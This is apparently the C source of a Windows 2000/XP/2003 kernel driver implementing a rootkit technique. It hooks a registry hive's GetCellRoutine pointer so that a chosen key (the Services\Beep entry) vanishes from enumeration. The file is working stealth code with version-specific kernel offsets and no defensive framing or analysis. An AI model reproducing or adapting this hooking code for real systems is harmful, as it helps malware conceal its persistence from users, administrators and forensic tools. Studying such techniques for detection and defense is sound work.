#include "ntddk.h"

#define GET_PTR(ptr, offset) \
	( *(PVOID*)( (ULONG)ptr + (offset##Offset) ))

#define CM_KEY_INDEX_ROOT	0x6972
#define CM_KEY_INDEX_LEAF	0x696C
#define CM_KEY_FAST_LEAF	0x666C
#define CM_KEY_HASH_LEAF	0x686C

#pragma pack(1)
typedef struct _CM_KEY_NODE {
	USHORT Signature;
	USHORT Flags;
	LARGE_INTEGER LastWriteTime;
	ULONG Spare;               // used to be TitleIndex
	HANDLE Parent;
	ULONG SubKeyCounts[2];     // Stable and Volatile
	HANDLE SubKeyLists[2];     // Stable and Volatile
	// ...
} CM_KEY_NODE, *PCM_KEY_NODE;

typedef struct _CM_KEY_INDEX {
	USHORT Signature;
	USHORT Count;
	HANDLE List[1];
} CM_KEY_INDEX, *PCM_KEY_INDEX;

typedef struct _CM_KEY_BODY {
	ULONG Type;                // "ky02"
	PVOID KeyControlBlock;
	PVOID NotifyBlock;
	PEPROCESS Process;         // the owner process
	LIST_ENTRY KeyBodyList; // key_nodes using the same kcb
} CM_KEY_BODY, *PCM_KEY_BODY;

typedef PVOID (__stdcall *PGET_CELL_ROUTINE)(PVOID, HANDLE);

typedef struct _HHIVE {
	ULONG Signature;
	PGET_CELL_ROUTINE GetCellRoutine;
	// ...
} HHIVE, *PHHIVE;
#pragma pack()

WCHAR g_HideKeyName[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Beep";

PGET_CELL_ROUTINE g_pGetCellRoutine = NULL;
PGET_CELL_ROUTINE* g_ppGetCellRoutine = NULL;

PCM_KEY_NODE g_HideNode = NULL;
PCM_KEY_NODE g_LastNode = NULL;

HANDLE OpenKeyByName(PCWSTR pwcsKeyName)
{
	NTSTATUS status;
	UNICODE_STRING uKeyName;
	OBJECT_ATTRIBUTES oa;
	HANDLE hKey;
	RtlInitUnicodeString(&uKeyName, pwcsKeyName);
	InitializeObjectAttributes(&oa, 
		&uKeyName, 
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	status = ZwOpenKey(&hKey, KEY_READ, &oa);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("ZwOpenKey failed\n");
		return NULL;
	}
	return hKey;
}

PVOID GetKeyControlBlock(HANDLE hKey)
{
	NTSTATUS status;
	PCM_KEY_BODY KeyBody;
	PVOID kcb;

	if (hKey == NULL)
		return NULL;

	status = ObReferenceObjectByHandle(hKey,
		KEY_READ,
		NULL,
		KernelMode,
		&KeyBody,
		NULL);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("ObreferencedObjectByHandle Failed\n");
		return NULL;
	}

	kcb = KeyBody->KeyControlBlock;
	ObDereferenceObject(KeyBody);
	return kcb;
}

PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node)
{
	PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, Node->Parent);
	PCM_KEY_INDEX Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, ParentNode->SubKeyLists[0]);

	DbgPrint("ParentNode = %lx\nIndex = %lx\n", ParentNode, Index);

	if (Index->Signature == CM_KEY_INDEX_ROOT)
	{
		Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, Index->List[Index->Count - 1]);
		DbgPrint("Index = %lx\n", Index);
	}

	if (Index->Signature == CM_KEY_FAST_LEAF || Index->Signature == CM_KEY_HASH_LEAF)
	{
		return g_pGetCellRoutine(Hive, Index->List[2*(Index->Count-1)]);
	}
	else
	{
		return g_pGetCellRoutine(Hive, Index->List[Index->Count-1]);
	}
}

PVOID MyGetCellRoutine(PVOID Hive, HANDLE Cell)
{
	PVOID pRet = g_pGetCellRoutine(Hive, Cell);
	if (pRet)
	{
		if (pRet == g_HideNode)
		{
			DbgPrint("GetCellRoutine(%lx, %08lx) == %lx\n", Hive, Cell, pRet);
			pRet = g_LastNode = (PCM_KEY_NODE)GetLastKeyNode(Hive, g_HideNode);
			DbgPrint("g_LastNode = %lx\n", g_LastNode);
			if (pRet == g_HideNode) pRet = NULL;
		}
		else if (pRet == g_LastNode)
		{
			DbgPrint("GetCellRoutine(%lx, %08lx) == %lx\n", Hive, Cell, pRet);
			pRet = g_LastNode = NULL;
		}
	}
	return pRet;
}

NTSTATUS DriverUnload(PDRIVER_OBJECT pDrvObj)
{
	DbgPrint("DriverUnload()\n");
	if (g_ppGetCellRoutine)
		*g_ppGetCellRoutine = g_pGetCellRoutine;
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pRegPath)
{
	ULONG BuildNumber;
	ULONG KeyHiveOffset;       // KeyControlBlock->KeyHive
	ULONG KeyCellOffset;       // KeyControlBlock->KeyCell
	HANDLE hKey;
	PVOID KCB, Hive;

	DbgPrint("DriverEntry()\n");
	pDrvObj->DriverUnload = DriverUnload;

	if (PsGetVersion(NULL, NULL, &BuildNumber, NULL)) 
		return STATUS_NOT_SUPPORTED;
	DbgPrint("BuildNumber = %d\n", BuildNumber);

	switch (BuildNumber)
	{
	case 2195:     // Win2000
		KeyHiveOffset = 0xc;
		KeyCellOffset = 0x10;
		break;
	case 2600:     // WinXP
	case 3790:     // Win2003
		KeyHiveOffset = 0x10;
		KeyCellOffset = 0x14;
		break;
	default:
		return STATUS_NOT_SUPPORTED;
	}


	hKey = OpenKeyByName(g_HideKeyName);
	KCB = GetKeyControlBlock(hKey);
	if (KCB)
	{
		PHHIVE Hive = (PHHIVE)GET_PTR(KCB, KeyHive);
		g_ppGetCellRoutine = &Hive->GetCellRoutine;
		g_pGetCellRoutine = Hive->GetCellRoutine;
		DbgPrint("GetCellRoutine = %lx\n", g_pGetCellRoutine);
		g_HideNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, GET_PTR(KCB, KeyCell));
		Hive->GetCellRoutine = MyGetCellRoutine;
	}
	ZwClose(hKey);

	return STATUS_SUCCESS;
}
